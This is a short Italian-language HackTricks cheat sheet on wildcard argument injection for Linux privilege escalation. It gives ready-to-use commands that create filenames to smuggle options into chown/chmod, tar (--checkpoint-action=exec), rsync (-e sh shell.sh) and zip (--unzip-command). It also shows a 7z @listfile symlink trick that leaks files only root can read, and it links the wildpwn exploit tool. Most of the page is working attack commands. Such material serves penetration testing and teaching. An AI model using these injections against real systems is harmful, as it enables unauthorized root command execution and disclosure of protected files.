{{#include ../../banners/hacktricks-training.md}}

## chown, chmod

Puoi **indicare quale proprietario del file e quali permessi desideri copiare per il resto dei file**
```bash
touch "--reference=/my/own/path/filename"
```
Puoi sfruttare questo usando [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(attacco combinato)_\
Ulteriori informazioni in [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## Tar

**Esegui comandi arbitrari:**
```bash
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
Puoi sfruttare questo usando [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(attacco tar)_\
Ulteriori informazioni in [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## Rsync

**Esegui comandi arbitrari:**
```bash
Interesting rsync option from manual:

-e, --rsh=COMMAND           specify the remote shell to use
--rsync-path=PROGRAM    specify the rsync to run on remote machine
```

```bash
touch "-e sh shell.sh"
```
Puoi sfruttare questo usando [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(\_rsync \_attack)_\
Ulteriori informazioni in [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## 7z

In **7z** anche usando `--` prima di `*` (nota che `--` significa che l'input successivo non può essere trattato come parametri, quindi solo percorsi di file in questo caso) puoi causare un errore arbitrario per leggere un file, quindi se un comando come il seguente viene eseguito da root:
```bash
7za a /backup/$filename.zip -t7z -snl -p$pass -- *
```
E puoi creare file nella cartella in cui viene eseguito questo, potresti creare il file `@root.txt` e il file `root.txt` come un **symlink** al file che vuoi leggere:
```bash
cd /path/to/7z/acting/folder
touch @root.txt
ln -s /file/you/want/to/read root.txt
```
Poi, quando **7z** viene eseguito, tratterà `root.txt` come un file contenente l'elenco dei file che dovrebbe comprimere (questo è ciò che indica l'esistenza di `@root.txt`) e quando 7z legge `root.txt`, leggerà `/file/you/want/to/read` e **poiché il contenuto di questo file non è un elenco di file, genererà un errore** mostrando il contenuto.

_Maggiori informazioni nei Write-up della box CTF di HackTheBox._

## Zip

**Eseguire comandi arbitrari:**
```bash
zip name.zip files -T --unzip-command "sh -c whoami"
```
{{#include ../../banners/hacktricks-training.md}}
